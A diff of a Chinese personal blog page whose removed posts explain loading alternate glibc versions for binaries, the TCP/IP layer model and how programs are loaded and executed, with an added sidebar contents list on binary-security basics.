-<p>64 位程序的默认链接器是<code>/lib64/ld-linux-x86-64.so.2</code>，但 32 位程序必须使用 32 位链接器<code>/lib/i386-linux-gnu/ld-linux.so.2</code>（若路径不同，可通过<code>dpkg -L libc6:i386 | grep ld-linux</code>查询）。</p>
-<h1 id="另一种方法"><a href="#另一种方法" class="headerlink" title="另一种方法"></a>另一种方法</h1><h2 id="编译不同版本的glibc"><a href="#编译不同版本的glibc" class="headerlink" title="编译不同版本的glibc"></a>编译不同版本的glibc</h2><p>首先要使用不同版本的glibc，我们需要有不同版本的 glibc 可执行文件，也就是 libc.so 和 ld.so。这两个文件是程序运行时所需要的文件按。</p>
-<p>当然也可以在网上找已经编译好的libc，但是找不到时自己编译的步骤如下：</p>
-<p>glibc-all-in-one：是一个开源项目，里面有各种版本的glibc 源码。</p>
-<p>然后编译glibc 的命令如下：</p>
-<p>git clone <a target="_blank" rel="noopener" href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p>
-<p>cd glibc-all-in-one</p>
-<p>chmod 777 build download extract</p>
-<p>sudo .&#x2F;build 2.29 amd64     #编译glibc<br>sudo .&#x2F;build 2.27 amd64<br>sudo .&#x2F;build 2.23 amd64</p>
-<h2 id="加载glibc"><a href="#加载glibc" class="headerlink" title="加载glibc"></a>加载glibc</h2><p>对于一个可执行文件，可以通过 LD_PRELOAD 来指定其使用 对应版本的 glibc。但是这里需要注意，还得指定一个对应版本的 ld.so，不然 可能会出现问题。</p>
-<p>使用方法如下，我习惯将 ld.so 和 libc.so.6 放到与程序同目录下。也可以自己改变路径。</p>
-<p>p &#x3D; process([“ld.so”, “.&#x2F;test”],<br>            env&#x3D;{“LD_PRELOAD”:”libc.so.6”})<br>通过上面的操作，我们就可以指定 test 加载对应版本的 glibc。</p>
-<h2 id="更换动态链接库"><a href="#更换动态链接库" class="headerlink" title="更换动态链接库"></a>更换动态链接库</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201153641147.png" alt="image-20251201153641147"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/07/26/TCP-IP-%E5%8D%8F%E8%AE%AE%E6%A0%88%E7%9A%84%E5%88%86%E5%B1%82%E7%BB%93%E6%9E%84/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.jpg">
-      <meta itemprop="name" content="JC">
-      <meta itemprop="description" content="ʕ´•ᴥ• ʔ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mvegetable'blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/07/26/TCP-IP-%E5%8D%8F%E8%AE%AE%E6%A0%88%E7%9A%84%E5%88%86%E5%B1%82%E7%BB%93%E6%9E%84/" class="post-title-link" itemprop="url">TCP/IP 协议栈的分层结构</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2025-07-26 01:57:26 / 修改时间：01:59:02" itemprop="dateCreated datePublished" datetime="2025-07-26T01:57:26+08:00">2025-07-26</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.4k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>TCP&#x2F;IP 协议栈</p>
-<p>TCP&#x2F;IP 协议栈是互联网的核心通信框架，它定义了计算机之间如何通过网络进行数据传输的一系列规则。这个协议栈采用分层结构设计，将复杂的网络通信过程分解为多个独立的功能层，每层专注于特定任务，并通过接口与上下层协作。</p>
-<h3 id="TCP-IP-协议栈的分层结构（4-层模型）"><a href="#TCP-IP-协议栈的分层结构（4-层模型）" class="headerlink" title="TCP&#x2F;IP 协议栈的分层结构（4 层模型）"></a>TCP&#x2F;IP 协议栈的分层结构（4 层模型）</h3><p>通常将 TCP&#x2F;IP 协议栈分为 4 层（从底层到上层），每层包含不同的协议，共同完成数据的封装、传输和解析：</p>
-<h4 id="1-网络接口层（Network-Interface-Layer）"><a href="#1-网络接口层（Network-Interface-Layer）" class="headerlink" title="1. 网络接口层（Network Interface Layer）"></a>1. 网络接口层（Network Interface Layer）</h4><ul>
-<li><p><strong>作用</strong>：负责将数据通过物理网络（如以太网、Wi-Fi）传输，处理硬件相关的通信细节。</p>
-</li>
-<li><p>核心协议 &#x2F; 技术</p>
-<p>：</p>
-<ul>
-<li>以太网（Ethernet）：定义了局域网内数据传输的帧格式（包含 MAC 地址、校验码等）。</li>
-<li>Wi-Fi（802.11 协议）：无线局域网的通信标准。</li>
-<li>ARP（地址解析协议）：将 IP 地址转换为物理 MAC 地址，用于局域网内设备定位。</li>
-</ul>
-</li>
-<li><p><strong>数据单元</strong>：帧（Frame）</p>
-</li>
-</ul>
-<h4 id="2-网络层（Internet-Layer）"><a href="#2-网络层（Internet-Layer）" class="headerlink" title="2. 网络层（Internet Layer）"></a>2. 网络层（Internet Layer）</h4><ul>
-<li><p><strong>作用</strong>：负责跨网络（如局域网到广域网）的数据路由和转发，确保数据从源设备能找到目标地址。</p>
-</li>
-<li><p>核心协议</p>
-<p>：</p>
-<ul>
-<li>IP（网际协议）：最核心的协议，定义了 IP 地址（如 IPv4、IPv6），负责数据的分组和路由。</li>
-<li>ICMP（互联网控制消息协议）：用于网络诊断（如 <code>ping</code> 命令通过 ICMP 检测主机可达性）。</li>
-<li>IGMP（互联网组管理协议）：用于多播通信（如视频会议）。</li>
-</ul>
-</li>
-<li><p><strong>数据单元</strong>：数据包（Packet）</p>
-</li>
-</ul>
-<h4 id="3-传输层（Transport-Layer）"><a href="#3-传输层（Transport-Layer）" class="headerlink" title="3. 传输层（Transport Layer）"></a>3. 传输层（Transport Layer）</h4><ul>
-<li><p><strong>作用</strong>：提供端到端的可靠数据传输，处理数据的分段、重组、流量控制等。</p>
-</li>
-<li><p>核心协议</p>
-<p>：</p>
-<ul>
-<li>TCP（传输控制协议）：面向连接的可靠协议，通过三次握手建立连接、序列号保证顺序、重传机制处理丢包，适用于对可靠性要求高的场景（如网页、文件传输）。</li>
-<li>UDP（用户数据报协议）：无连接的不可靠协议，不保证数据到达顺序和完整性，但但传输速度快，适用于实时性要求高的场景（如视频通话、游戏）。</li>
-</ul>
-</li>
-<li><p><strong>数据单元</strong>：TCP 称为段（Segment），UDP 称为数据报（Datagram）</p>
-</li>
-</ul>
-<h4 id="4-应用层（Application-Layer）"><a href="#4-应用层（Application-Layer）" class="headerlink" title="4. 应用层（Application Layer）"></a>4. 应用层（Application Layer）</h4><ul>
-<li><p><strong>作用</strong>：直接为用户应用程序提供服务，定义了数据交互的格式和规则。</p>
-</li>
-<li><p>核心协议</p>
-<p>：</p>
-<ul>
-<li>HTTP&#x2F;HTTPS：用于 Web 页面传输（如浏览器访问网站）。</li>
-<li>FTP&#x2F;SFTP：用于文件传输。</li>
-<li>SMTP&#x2F;POP3&#x2F;IMAP：用于邮件发送和接收。</li>
-<li>DNS：用于将域名（如 <code>example.com</code>）解析为 IP 地址。</li>
-<li>SSH&#x2F;Telnet：用于远程登录服务器。</li>
-</ul>
-</li>
-<li><p><strong>数据单元</strong>：数据（Data）</p>
-</li>
-</ul>
-<h3 id="数据传输的封装与解封装过程"><a href="#数据传输的封装与解封装过程" class="headerlink" title="数据传输的封装与解封装过程"></a>数据传输的封装与解封装过程</h3><p>TCP&#x2F;IP 协议栈通过 “封装” 和 “解封装” 实现数据传输，以浏览器访问网站为例：</p>
-<ol>
-<li><strong>封装（发送端）</strong>：<ul>
-<li>应用层：浏览器生成 HTTP 请求数据（如 <code>GET /index.html</code>）。</li>
-<li>传输层：TCP 为数据添加头部（源端口、目标端口、序列号等），形成 TCP 段。</li>
-<li>网络层：IP 为 TCP 段添加头部（源 IP、目标 IP、路由信息等），形成 IP 数据包。</li>
-<li>网络接口层：以太网为 IP 包添加头部（源 MAC、目标 MAC）和尾部（校验码），形成帧，通过物理介质（网线 &#x2F; Wi-Fi）发送。</li>
-</ul>
-</li>
-<li><strong>解封装（接收端）</strong>：<ul>
-<li>网络接口层：接收帧，校验并移除以太网头部，将 IP 数据包交给网络层。</li>
-<li>网络层：解析 IP 头部，确认目标 IP 匹配后，移除 IP 头部，将 TCP 段交给传输层。</li>
-<li>传输层：TCP 验证序列号，重组分段数据，移除 TCP 头部，将 HTTP 数据交给应用层。</li>
-<li>应用层：服务器解析 HTTP 请求，处理后返回响应，重复封装过程回传客户端。</li>
-</ul>
-</li>
-</ol>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>TCP&#x2F;IP 协议栈是互联网的 “交通规则”，通过分层设计实现了功能解耦：</p>
-<ul>
-<li>底层（网络接口层、网络层）负责 “数据怎么传”（物理传输、路由）；</li>
-<li>上层（传输层、应用层）负责 “传什么数据”（可靠传输、应用交互）。</li>
-</ul>
-<p>这种结构使得不同厂商的设备（如电脑、路由器、服务器）能遵循统一标准通信，是互联网互联互通的基础。</p>
-<p>我们以日常生活中 **“浏览网页（HTTP 请求）”<strong>为例，详细说明 TCP&#x2F;IP 协议栈各层（应用层、传输层、网络层、网络接口层）的协作关系，以及数据在各层之间的</strong>封装、传递、解封装 ** 过程。</p>
-<h3 id="场景：用户在浏览器输入www-example-com并回车，请求加载网页"><a href="#场景：用户在浏览器输入www-example-com并回车，请求加载网页" class="headerlink" title="场景：用户在浏览器输入www.example.com并回车，请求加载网页"></a>场景：用户在浏览器输入<code>www.example.com</code>并回车，请求加载网页</h3><h4 id="步骤-1：应用层（HTTP-协议）生成数据"><a href="#步骤-1：应用层（HTTP-协议）生成数据" class="headerlink" title="步骤 1：应用层（HTTP 协议）生成数据"></a>步骤 1：应用层（HTTP 协议）生成数据</h4><ul>
-<li><p><strong>功能</strong>：应用层负责处理用户的具体需求（这里是 “获取网页内容”），使用 HTTP 协议定义数据格式。</p>
-</li>
-<li><p>过程</p>
-<p>：</p>
-<p>浏览器（应用层程序）生成一个 HTTP 请求报文，内容大致如下：</p>
-<p>plaintext</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1  </span><br><span class="line">Host: www.example.com  </span><br><span class="line">User-Agent: Chrome/100.0.0.0  </span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>这部分是 “原始数据”，需要交给下层（传输层）处理。</p>
-</li>
-</ul>
-<h4 id="步骤-2：传输层（TCP-协议）封装：添加-“端口信息”"><a href="#步骤-2：传输层（TCP-协议）封装：添加-“端口信息”" class="headerlink" title="步骤 2：传输层（TCP 协议）封装：添加 “端口信息”"></a>步骤 2：传输层（TCP 协议）封装：添加 “端口信息”</h4><ul>
-<li><p><strong>功能</strong>：传输层负责 “端到端” 的可靠传输（TCP 是可靠协议），通过<strong>端口号</strong>区分同一设备上的不同应用（如浏览器用 80&#x2F;443 端口，QQ 用其他端口）。</p>
-</li>
-<li><p>过程</p>
-<p>：</p>
-<p>传输层（TCP）会在 HTTP 数据前添加一个</p>
-<p>TCP 头部</p>
-<p>，包含：</p>
-<ul>
-<li>源端口（浏览器随机分配，如<code>54321</code>）：标记 “哪个应用发送的”；</li>
-<li>目标端口（<code>80</code>，HTTP 默认端口）：标记 “目标服务器的哪个应用接收”；</li>
-<li>序列号、确认号：用于确保数据有序、不丢失（TCP 的 “可靠” 特性）。<br>此时数据单元称为<strong>TCP 段（Segment）</strong>，交给下层（网络层）。</li>
-</ul>
-</li>
-</ul>
-<h4 id="步骤-3：网络层（IP-协议）封装：添加-“IP-地址信息”"><a href="#步骤-3：网络层（IP-协议）封装：添加-“IP-地址信息”" class="headerlink" title="步骤 3：网络层（IP 协议）封装：添加 “IP 地址信息”"></a>步骤 3：网络层（IP 协议）封装：添加 “IP 地址信息”</h4><ul>
-<li><p><strong>功能</strong>：网络层负责 “跨网络路由”，通过<strong>IP 地址</strong>确定数据的传输路径（从用户设备到目标服务器）。</p>
-</li>
-<li><p>过程</p>
-<p>：</p>
-<p>网络层（IP）在 TCP 段前添加</p>
-<p>IP 头部</p>
-<p>，包含：</p>
-<ul>
-<li>源 IP 地址（用户设备的 IP，如<code>192.168.1.100</code>）；</li>
-<li>目标 IP 地址（<code>www.example.com</code>对应的 IP，如<code>93.184.216.34</code>，通过 DNS 解析获得）；</li>
-<li>协议类型（此处为<code>6</code>，表示上层是 TCP）。<br>此时数据单元称为<strong>IP 数据包（Packet）</strong>，交给下层（网络接口层）。</li>
-</ul>
-</li>
-</ul>
-<h4 id="步骤-4：网络接口层（以太网协议）封装：添加-“MAC-地址信息”"><a href="#步骤-4：网络接口层（以太网协议）封装：添加-“MAC-地址信息”" class="headerlink" title="步骤 4：网络接口层（以太网协议）封装：添加 “MAC 地址信息”"></a>步骤 4：网络接口层（以太网协议）封装：添加 “MAC 地址信息”</h4><ul>
-<li><p><strong>功能</strong>：网络接口层负责 “物理介质传输”，通过<strong>MAC 地址</strong>在局域网内识别设备（如路由器、交换机）。</p>
-</li>
-<li><p>过程</p>
-<p>：</p>
-<p>网络接口层（以太网）在 IP 数据包前添加</p>
-<p>以太网头部</p>
-<p>，包含：</p>
-<ul>
-<li>源 MAC 地址（用户设备的网卡 MAC，如<code>00:1A:2B:3C:4D:5E</code>）；</li>
-<li>目标 MAC 地址（局域网内下一跳设备的 MAC，通常是路由器的 MAC，如<code>AA:BB:CC:DD:EE:FF</code>）；</li>
-<li>类型（<code>0x0800</code>，表示上层是 IP 协议）。<br>同时在数据尾部添加<strong>帧校验序列（FCS）</strong>，用于校验数据传输是否出错。<br>此时数据单元称为<strong>以太网帧（Frame）</strong>，通过物理介质（网线 &#x2F; Wi-Fi）发送。</li>
-</ul>
-</li>
-</ul>
-<h4 id="步骤-5：数据在网络中传输（路由转发）"><a href="#步骤-5：数据在网络中传输（路由转发）" class="headerlink" title="步骤 5：数据在网络中传输（路由转发）"></a>步骤 5：数据在网络中传输（路由转发）</h4><ul>
-<li>以太网帧从用户设备发送到路由器，路由器解析以太网头部（验证 MAC 地址是否匹配），然后移除以太网头部，提取 IP 数据包。</li>
-<li>路由器根据 IP 头部的 “目标 IP 地址”（<code>93.184.216.34</code>）查询路由表，确定下一跳设备（可能是其他路由器），重新封装新的以太网帧（目标 MAC 地址改为下一跳设备的 MAC），继续转发。</li>
-<li>经过多跳路由后，数据最终到达<code>www.example.com</code>所在的服务器局域网。</li>
-</ul>
-<h4 id="步骤-6：接收端（服务器）解封装：逐层还原数据"><a href="#步骤-6：接收端（服务器）解封装：逐层还原数据" class="headerlink" title="步骤 6：接收端（服务器）解封装：逐层还原数据"></a>步骤 6：接收端（服务器）解封装：逐层还原数据</h4><p>服务器收到数据后，按 “从下到上” 的顺序解封装：</p>
-<ol>
-<li><strong>网络接口层</strong>：验证 FCS 无误后，移除以太网头部，提取 IP 数据包，交给网络层。</li>
-<li><strong>网络层</strong>：解析 IP 头部，确认目标 IP 是自己，移除 IP 头部，提取 TCP 段，交给传输层。</li>
-<li><strong>传输层</strong>：解析 TCP 头部，通过目标端口（<code>80</code>）确定交给 HTTP 服务，验证序列号确保数据完整，移除 TCP 头部，提取 HTTP 请求数据，交给应用层。</li>
-<li><strong>应用层</strong>：HTTP 服务处理请求，生成响应数据（网页内容），然后按上述步骤反向封装，发送回用户设备。</li>
-</ol>
-<h3 id="总结：各层关系的核心体现"><a href="#总结：各层关系的核心体现" class="headerlink" title="总结：各层关系的核心体现"></a>总结：各层关系的核心体现</h3><ul>
-<li><strong>依赖关系</strong>：应用层（HTTP）依赖传输层（TCP）的端口标识，传输层依赖网络层（IP）的地址路由，网络层依赖网络接口层（以太网）的物理传输。</li>
-<li><strong>封装 &#x2F; 解封装</strong>：发送端每层添加头部（封装），接收端每层移除头部（解封装），数据像 “剥洋葱” 一样逐层还原。</li>
-<li><strong>独立性</strong>：如果用户切换网络（如从有线换 Wi-Fi），只需网络接口层调整 MAC 地址和传输介质，上层（IP&#x2F;TCP&#x2F;HTTP）无需任何修改，体现了分层设计的灵活性。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/07/17/%E7%A8%8B%E5%BA%8F%E6%80%8E%E4%B9%88%E8%BF%90%E8%A1%8C%E8%B5%B7%E6%9D%A5%E7%9A%84/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.jpg">
-      <meta itemprop="name" content="JC">
-      <meta itemprop="description" content="ʕ´•ᴥ• ʔ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mvegetable'blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/07/17/%E7%A8%8B%E5%BA%8F%E6%80%8E%E4%B9%88%E8%BF%90%E8%A1%8C%E8%B5%B7%E6%9D%A5%E7%9A%84/" class="post-title-link" itemprop="url">程序怎么运行起来的</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2025-07-17 00:44:29 / 修改时间：00:46:23" itemprop="dateCreated datePublished" datetime="2025-07-17T00:44:29+08:00">2025-07-17</time>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.5k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="四大金刚"><a href="#四大金刚" class="headerlink" title="四大金刚"></a>四大金刚</h2><p>一个二进制文件运行起来需要四个核心部件： 可执行文件，操作系统（os），内存（ram），处理器（cpu）协同操作。</p>
-<h4 id="1-可执行文件（二进制文件）"><a href="#1-可执行文件（二进制文件）" class="headerlink" title="1. 可执行文件（二进制文件）"></a>1. 可执行文件（二进制文件）</h4><ul>
-<li><strong>作用</strong>：程序的 “静态载体”，包含计算机可直接执行的机器指令（二进制代码）、数据（如常量、初始化变量）、以及用于加载的元信息（如文件格式、内存布局描述、入口点地址等）。</li>
-<li><strong>常见格式</strong>：Windows 的 <code>.exe</code>、Linux 的 ELF（Executable and Linkable Format）、macOS 的 Mach-O 等。这些格式规定了指令和数据的组织方式，让操作系统能正确解析并加载。</li>
-</ul>
-<h4 id="2-操作系统（OS）"><a href="#2-操作系统（OS）" class="headerlink" title="2. 操作系统（OS）"></a>2. 操作系统（OS）</h4><ul>
-<li><p>作用</p>
-<p>：程序运行的 “管理者”，负责协调硬件资源并提供运行环境，核心功能包括：</p>
-<ul>
-<li><strong>加载程序</strong>：将可执行文件从磁盘读入内存，根据文件中的元信息（如段表）分配内存区域（代码段、数据段、栈、堆等），并设置权限（如代码段设为只读可执行）。</li>
-<li><strong>进程管理</strong>：为程序创建进程（或线程），分配进程控制块（PCB）记录进程状态（如 PID、寄存器值、内存映射等），并调度进程获得处理器时间。</li>
-<li><strong>资源抽象与分配</strong>：通过系统调用（如文件操作、内存分配）为程序提供统一的硬件访问接口，避免程序直接操作硬件。</li>
-<li><strong>内存管理</strong>：通过虚拟内存机制将程序的逻辑地址映射到物理内存，实现内存隔离（不同程序互不干扰）和高效利用（如内存分页、交换）。</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-内存（RAM）"><a href="#3-内存（RAM）" class="headerlink" title="3. 内存（RAM）"></a>3. 内存（RAM）</h4><ul>
-<li><p>作用</p>
-<p>：程序运行的 “临时数据空间”，用于存储程序执行过程中的指令和数据：</p>
-<ul>
-<li><strong>代码段（Text Segment）</strong>：存放可执行文件中的机器指令，供处理器读取并执行。</li>
-<li><strong>数据段（Data Segment）</strong>：存放初始化的全局变量、静态变量（编译时已知值）。</li>
-<li><strong>BSS 段</strong>：存放未初始化的全局变量、静态变量（默认初始化为 0，由操作系统在加载时分配空间）。</li>
-<li><strong>栈（Stack）</strong>：存储函数参数、局部变量、返回地址等（见前文详解）。</li>
-<li><strong>堆（Heap）</strong>：动态分配的内存（如<code>malloc</code>申请的空间），供程序运行时灵活使用。</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-处理器（CPU）"><a href="#4-处理器（CPU）" class="headerlink" title="4. 处理器（CPU）"></a>4. 处理器（CPU）</h4><ul>
-<li><p>作用</p>
-<p>：程序执行的 “运算核心”，负责逐条执行内存中的机器指令：</p>
-<ul>
-<li>通过<strong>程序计数器（PC）</strong> 指向当前要执行的指令地址，执行后自动更新为下一条指令地址。</li>
-<li>通过<strong>寄存器</strong>暂存运算数据（如累加器、地址寄存器），加速指令执行（寄存器速度远快于内存）。</li>
-<li>执行指令时涉及的运算（如加减、逻辑判断）、内存访问（如读数据、写结果）、跳转（如函数调用）等操作，均由 CPU 完成。</li>
-</ul>
-</li>
-</ul>
-<h2 id="运行过程"><a href="#运行过程" class="headerlink" title="运行过程"></a>运行过程</h2><ol>
-<li><strong>启动程序</strong>：用户通过操作系统（如调用系统的shell函数）触发程序运行请求。</li>
-<li><strong>加载到内存</strong>：操作系统解析可执行文件（elf文件格式），根据其元信息在内存中分配空间（代码段、数据段、栈等），将文件中的指令和数据复制到对应内存区域。</li>
-<li><strong>创建进程</strong>：操作系统为程序创建进程，初始化进程控制块（PCB），设置程序入口点（第一条指令的内存地址）。</li>
-<li><strong>调度执行</strong>：操作系统将进程放入调度队列，当分配到 CPU 时间片时，CPU 从程序入口点开始执行指令：<ul>
-<li>从内存中读取指令到 CPU，解码后执行（如运算、读写内存、调用函数等）。</li>
-<li>执行过程中动态使用栈（函数调用）和堆（动态内存），操作系统负责维护内存映射和权限。</li>
-</ul>
-</li>
-<li><strong>终止程序</strong>：程序执行完<code>main</code>函数（或调用<code>exit</code>）后，操作系统回收进程占用的内存、CPU 等资源，进程终止。</li>
-</ol>
-<p><strong>注意</strong> ：1.可执行文件是elf格式 启动阶段 操作系统为起分配  <strong>虚拟内存</strong>（连续）也就是在此时 堆和栈诞生（与程序的生命周期相同）其中堆需要可执行文件中具有申请堆操作 而 栈是与生俱来的。</p>
-<p>2.程序启动的初期阶段（如创建进程、分配虚拟内存、设置堆栈）需要操作系统内核完成，因此代码运行在<strong>内核态</strong>。</p>
-<p>3.虚拟内存加载到物理内存的过程是<strong>动态且按需发生的</strong>执行到哪加载到哪 cpu 只能处理实际地址的内容</p>
-<p>4.启动程序的过程本质是将静态的可执行文件加载到系统中，并创建对应的进程</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
-  </nav>
 
 
 
@@ -5809,6 +4598,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">二进制基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-%E4%BB%80%E4%B9%88%E6%98%AF%E4%BA%8C%E8%BF%9B%E5%88%B6"><span class="nav-number">1.1.</span> <span class="nav-text">一.什么是二进制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFPwn"><span class="nav-number">1.1.1.</span> <span class="nav-text">什么是Pwn?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRE"><span class="nav-number">1.1.2.</span> <span class="nav-text">什么是RE?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E6%98%AF%E6%94%BB%E4%B8%8E%E6%94%BE%E7%9A%84%E5%8D%9A%E5%BC%88"><span class="nav-number">1.1.3.</span> <span class="nav-text">二进制安全是攻与放的博弈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E8%83%BD%E5%B9%B2%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">1.1.4.</span> <span class="nav-text">二进制安全能干什么？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80"><span class="nav-number">1.2.</span> <span class="nav-text">二.汇编语言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%BA%E5%99%A8%E8%AF%AD%E8%A8%80%EF%BC%9A"><span class="nav-number">1.2.1.</span> <span class="nav-text">机器语言：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%EF%BC%9A"><span class="nav-number">1.2.2.</span> <span class="nav-text">汇编指令：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8Ec%E8%AF%AD%E8%A8%80%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%EF%BC%9A"><span class="nav-number">1.2.3.</span> <span class="nav-text">从c语言到可执行程序：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%93%BE%E6%8E%A5-%EF%BC%9A%E7%94%B1-o%E6%96%87%E4%BB%B6%E5%88%B0elf%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="nav-number">1.2.4.</span> <span class="nav-text">链接 ：由.o文件到elf可执行文件：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E5%86%85%E5%AD%98"><span class="nav-number">1.3.</span> <span class="nav-text">三.寄存器和内存</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E5%86%85%E5%AD%98%EF%BC%9A"><span class="nav-number">1.3.1.</span> <span class="nav-text">寄存器和内存：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%9A"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">寄存器：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%EF%BC%9A"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">内存：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%90%86%E8%A7%A3%EF%BC%9A"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">理解：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">例子：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98"><span class="nav-number">1.3.2.</span> <span class="nav-text">内存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux-x86-%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4%E5%B8%83%E5%B1%80"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">Linux x86 进程内存空间布局</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%AE%B5-Text-Segment-%E2%80%94-%E8%B5%B7%E5%A7%8B%E4%BA%8E-0x08048000"><span class="nav-number">1.3.2.1.1.</span> <span class="nav-text">代码段(Text Segment)— 起始于 0x08048000</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%AE%B5-Data-Segment"><span class="nav-number">1.3.2.1.2.</span> <span class="nav-text">数据段(Data Segment)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A0%86%E2%80%94%E5%90%91%E4%B8%8A%E5%A2%9E%E9%95%BF"><span class="nav-number">1.3.2.1.3.</span> <span 